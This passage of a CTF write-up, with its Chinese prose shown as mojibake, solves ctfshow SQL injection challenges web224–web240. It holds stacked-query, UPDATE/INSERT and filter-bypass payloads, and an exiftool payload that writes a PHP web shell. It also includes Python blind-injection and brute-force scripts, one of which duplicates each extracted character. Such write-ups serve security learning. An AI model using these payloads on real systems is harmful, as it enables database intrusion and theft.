punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span></code></pre><p>æŸ¥è¯¢è¯­å¥ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">$sql &#x3D; &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#39;&quot;.$filename.&quot;&#39;,&#39;&quot;.$filepath.&quot;&#39;,&#39;&quot;.$filetype.&quot;&#39;);&quot;;</code></pre><p><img src="https://img-blog.csdnimg.cn/2020050915132686.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><br>ä¸€èˆ¬å†™æˆ16è¿›åˆ¶å½¢å¼ï¼Œé¿å…è¯­å¥æœ¬èº«çš„å•å¼•å·åŒå¼•å·å¯¹æ‹¼æ¥é€ æˆå¹²æ‰°</p><p><img src="https://img-blog.csdnimg.cn/20200509151345661.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"><br>æœ¬åœ°æµ‹è¯•å‘ç°ï¼Œå†™è¿›å»çš„16è¿›åˆ¶ä¼šè‡ªåŠ¨è¢«è®¡ç®—æœºè¯†åˆ«å‡ºASCII</p><p>ç”¨åˆ°exiftoolå·¥å…·æŠŠè¿™ä¸ªè¯­å¥å†™åˆ°å›¾ç‰‡å±æ€§é‡Œé¢  è¯­æ³•ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">exiftool -overwrite_original -comment&#x3D;&quot;y1ng\&quot;&#39;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;--+&quot;</code></pre><h4 id="web225-å †å plus"><a href="#web225-å †å plus" class="headerlink" title="web225(å †å plus)"></a>web225(å †å plus)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p><strong>hander</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;ctfshow&#39;;show tables;?username&#x3D;ctfshow&#39;;handler &#96;ctfshow_flagasa&#96; open;handler &#96;ctfshow_flagasa&#96; read first;</code></pre><p><strong>é¢„å¤„ç†</strong></p><p>åˆ©ç”¨concatç»•è¿‡ä¸€åˆ‡è¿‡æ»¤ï¼Œä¹‹åå°±æ˜¯æ›¿æ¢åé¢çš„database()ä¸ºæƒ³è¦æ‰§è¡Œçš„è¯­å¥å³å¯ï¼Œåˆ«å¿˜äº†åŠ ç©ºæ ¼</p><p>å¯¹äºä¸çŸ¥é“å•¥æ˜¯é¢„å¤„ç†ï¼š<a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450">SQlæ³¨å…¥å¼ºç½‘æ¯ 2019</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">username&#x3D;user1&#39;;PREPARE y4tacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; database()&#39;);EXECUTE y4tacker;</code></pre><p>å½“ç„¶<code>concat(char(115,101,108,101,99,116)</code>ä¹Ÿå¯ä»¥ä»£æ›¿<code>select</code></p><p><strong>show</strong> å±•ç¤ºä¸€ä¸‹è¡¨ååˆ—å</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;;show tables;#&#39;;show columns from &#96;ctfshow_flagasa&#96;;#</code></pre><h4 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>   </code></pre><p>banäº†<code>show</code>å’Œ<code>(</code>ï¼Œå¯ä»¥ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡</p><p><img src="web226.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE hsad;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasb from ctfsh_ow_flagas?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE hsad;</code></pre><h4 id="web227-information-schema-Routines"><a href="#web227-information-schema-Routines" class="headerlink" title="web227(information_schema.Routines)"></a>web227(information_schema.Routines)</h4><p>è¿™é“é¢˜ï¼Œä½ å°±ç®—æ‰¾éæ‰€æœ‰åœ°æ–¹åŸºæœ¬ä¸Šéƒ½æ‰¾ä¸åˆ°flagè¡¨<br>å…ˆç»™å‡ºå…¶ä¸­ä¸€ä¸ª<code>payload1&#39;;call getFlag();</code>è™½ç„¶èƒ½å¾—åˆ°ç­”æ¡ˆä½†æ˜¯æ„ä¹‰ä¸å¤§<br>è¿™é“é¢˜è€ƒç‚¹å…¶å®æ˜¯æŸ¥çœ‹MySQLçš„å­˜å‚¨è¿‡ç¨‹<br><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQLâ€”â€”æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°</a></p><p><strong>æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„ä¿¡æ¯</strong><br>åœ¨  MySQL ä¸­ï¼Œå­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„ä¿¡æ¯å­˜å‚¨åœ¨<code>information_schema</code>æ•°æ®åº“ä¸‹çš„<code>Routines</code>è¡¨ä¸­ï¼Œå¯ä»¥é€šè¿‡æŸ¥è¯¢è¯¥è¡¨çš„è®°å½•æ¥æŸ¥è¯¢å­˜å‚¨</p><p>è¿‡ç¨‹å’Œå‡½æ•°çš„ä¿¡æ¯ï¼Œå…¶åŸºæœ¬çš„è¯­æ³•å½¢å¼å¦‚ä¸‹:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM information_schema.RoutinesWHERE ROUTINE_NAME&#x3D;&#39; sp_name&#39;;</code></pre><p>å…¶ä¸­ï¼ŒROUTINE_NAME  å­—æ®µä¸­å­˜å‚¨çš„æ˜¯å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„åç§°;   sp_name  å‚æ•°è¡¨ç¤ºå­˜å‚¨è¿‡ç¨‹æˆ–å‡½æ•°çš„åç§°ã€‚</p><p>æˆ‘ä»¬å»æŸ¥<code>information_schema.routines</code>è¡¨</p><p><img src="web227.png" loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°getFlagå‡½æ•°ï¼Œå½“ç„¶flagç›´æ¥å°±æœ‰</p><h4 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span><span class="token variable">$bansql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select char from banlist;"</span><span class="token punctuation">;</span>    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¸ˆå‚…è¯´å†…å®¹å¤ªå¤šï¼Œå°±å†™å…¥æ•°æ®åº“ä¿å­˜</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$banlist</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$banlist</span> <span class="token keyword">as</span> <span class="token variable">$char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$char</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from ctfsh_ow_flagasaa?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;EXECUTE hsad;</code></pre><h4 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from flag?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d20666c6167;EXECUTE hsad;</code></pre><h4 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasbas from flagaabbx?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;EXECUTE hsad;</code></pre><h4 id="web231-updateæ³¨å…¥"><a href="#web231-updateæ³¨å…¥" class="headerlink" title="web231(updateæ³¨å…¥)"></a>web231(updateæ³¨å…¥)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//åˆ†é¡µæŸ¥è¯¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>' where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:æŸ¥è¡¨å  banlist,ctfshow_user,flagapassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;noæŸ¥åˆ—å  id,flagas,infopassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;,username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h4><p>å’Œä¸Šä¸€é¢˜ç›¸æ¯”å¤šç»™ password å¥—äº†ä¸€å±‚ md5 å‡½æ•°åé¢è¿˜æœ‰ä¸ª<code>)</code>æ³¨æ„é—­åˆï¼Œå¯¹åé¢çš„ username æ— å½±å“ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:æŸ¥è¡¨å  banlist,ctfshow_user,flagaapassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;noæŸ¥åˆ—å  id,flagass,infopassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;),username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h4><p>ç¦ç”¨äº†<code>&#39;</code>ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>\</code></p><p>å‡è®¾æˆ‘ä»¬passwordä¼ å…¥\ï¼Œusernameä¼ å…¥,username&#x3D;database()#</p><p>é‚£ä¹ˆæœ€ç»ˆæ„æˆçš„è¯­å¥å¦‚ä¸‹</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;,username&#x3D;database()#&#39;ç­‰ä»·äºupdate ctfshow_user set pass &#x3D; &#39;x&#39;,username&#x3D;database()#&#39;</code></pre><p>æ‰€ä»¥å°±å¯ä»¥ç»•è¿‡äº†ã€‚</p><p><strong>payload</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#è·å–è¡¨å  banlist,ctfshow_user,flag233333password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#è·å–åˆ—å  id,flagass233,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;)%23#è·å–æ•°æ®password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass233) from flag233333)%23</code></pre><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://c095983b-1faf-4d65-a053-ba620caed799.challenge.ctf.show/api/?page=1&amp;limit=10"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥æ•°æ®åº“</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥è¡¨å</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='flag233333' limit 1,1"</span>        <span class="token comment"># æŸ¥æ•°æ®</span>        payload <span class="token operator">=</span> <span class="token string">"select flagass233 from flag233333"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'4'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#è·å–è¡¨å  banlist,ctfshow_user,flag23apassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#è·å–åˆ—å  id,flagass23s3,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)%23#è·å–æ•°æ®password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass23s3) from flag23a)%23</code></pre><h4 id="web235-mysql-innodb-table-stats-æ— åˆ—åæ³¨å…¥"><a href="#web235-mysql-innodb-table-stats-æ— åˆ—åæ³¨å…¥" class="headerlink" title="web235(mysql.innodb_table_stats  æ— åˆ—åæ³¨å…¥)"></a>web235(mysql.innodb_table_stats  æ— åˆ—åæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤ or ' </span></code></pre><p>å› ä¸ºorè¢«ç¦å¯¼è‡´<code>information_schema.tables</code>ä¹Ÿè¢«ç¦äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¡¨<code>mysql.innodb_table_stats</code>å’Œ<code>mysql.innodb_index_stats</code></p><p>æ¥ä»£æ›¿ã€‚</p><p><a href="https://www.jb51.net/article/134678.htm">æ¦‚è¿°MySQLç»Ÿè®¡ä¿¡æ¯</a></p><blockquote><p>5.6.6å¼€å§‹ï¼ŒMySQLé»˜è®¤ä½¿ç”¨äº†æŒä¹…åŒ–ç»Ÿè®¡ä¿¡æ¯ï¼Œå³INNODB_STATS_PERSISTENT&#x3D;ONï¼ŒæŒä¹…åŒ–ç»Ÿè®¡ä¿¡æ¯ä¿å­˜åœ¨è¡¨mysql.innodb_table_statså’Œmysql.innodb_index_statsã€‚</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/98206699">Mysqlæ— åˆ—åæ³¨å…¥</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#è·å–è¡¨å  banlist,ctfshow_user,flag23a1password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##æŸ¥æ•°æ®â€”â€”ç»„åˆ  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;) from (select 1,2,3 union select * from flag23a1 limit 1,1)a);##æŸ¥æ•°æ®â€”â€”é‡å‘½åï¼Œå½“&#96;è¢«è¿‡æ»¤çš„æ—¶å€™password&#x3D;\&amp;username&#x3D;,username&#x3D;(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a);#</code></pre><h4 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤ or ' flag</span></code></pre><p>è¿‡æ»¤çš„æ˜¯è¿”å›çš„flagï¼Œæ‰€ä»¥ç”¨<code>to_base64</code>ç»•è¿‡</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#è·å–è¡¨å  banlist,ctfshow_user,flagapassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##æŸ¥æ•°æ®â€”â€”ç»„åˆ  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,to_base64(&#96;2&#96;),&#96;3&#96;) from (select 1,2,3 union select * from flaga limit 1,1)a);##æŸ¥æ•°æ®â€”â€”é‡å‘½åï¼Œå½“&#96;è¢«è¿‡æ»¤çš„æ—¶å€™password&#x3D;\&amp;username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a);#</code></pre><h4 id="web237-insertæ³¨å…¥"><a href="#web237-insertæ³¨å…¥" class="headerlink" title="web237(insertæ³¨å…¥)"></a>web237(insertæ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ’å…¥æ•°æ®</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into ctfshow_user(username,pass) value('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>');"</span><span class="token punctuation">;</span></code></pre><p>å‘valueå€¼å†…è¿›è¡Œæ’å…¥ï¼Œå’Œupdateæ³¨å…¥çš„é€»è¾‘ä¸€æ ·</p><p><code>insert into table_name(column1, column2) value(value1,value2)</code></p><p>å‘value1è¿›è¡Œæ³¨å…¥ï¼Œå°±ä¼šå˜æˆ</p><p><code>insert into table_name(column1, column2) value( value1,(ä½ æƒ³è¦è¾“å‡ºçš„å€¼) )#value2)</code></p><p>æ‰€ä»¥è¦æ³¨æ„å¯¹æœ€åä¸€ä¸ªæ‹¬å·çš„é—­åˆ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å  banlist,ctfshow_user,flagusername&#x3D;z&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#&amp;password&#x3D;1# æŸ¥åˆ—å  id,flagass23s3,infousername&#x3D;zz&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select flagass23s3 from flag))#&amp;password&#x3D;1</code></pre><h4 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h4><p>è¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨<code>()</code>ç»•è¿‡</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å  banlist,ctfshow_user,flagbusername&#x3D;z&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())))#&amp;password&#x3D;1# æŸ¥åˆ—å  id,flag,infousername&#x3D;zz&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select(flag)from(flagb)))#&amp;password&#x3D;1</code></pre><h4 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤ç©ºæ ¼ or </span></code></pre><p>å’Œä¹‹å‰ä¸€æ ·å¯ä»¥ä½¿ç”¨mysql.innodb_table_stats</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># æŸ¥è¡¨å  banlist,ctfshow_user,flagbbusername&#x3D;z&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1# getFlagusername&#x3D;zz&#39;,(select(flag)from(flagbb)))#&amp;password&#x3D;1#  ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ— åˆ—åæ³¨å…¥ä¸è¡Œï¼Œwpéƒ½æ˜¯ç›²çŒœåˆ—åusername&#x3D;zz&#39;,(select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)))#&amp;password&#x3D;1select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)</code></pre><h4 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h4><p><strong>Hint</strong>: è¡¨åå…±9ä½ï¼Œflagå¼€å¤´ï¼Œåäº”ä½ç”±a&#x2F;bç»„æˆï¼Œå¦‚flagabaabï¼Œå…¨å°å†™</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿‡æ»¤ç©ºæ ¼ or sys mysql</span></code></pre><p>è¡¨åé çˆ†ç ´åˆ—åé çŒœ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> repost_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/insert.php"</span>flag_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/?desc&amp;page=1&amp;limit=10"</span>payloads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f",(select(flag)from(flag</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">)))#"</span></span><span class="token punctuation">&#125;</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>d<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token string">"ab"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'ctfshow&#123;[0-9a-fA-F\-]+&#125;'</span><span class="token punctuation">)</span><span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>post_url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    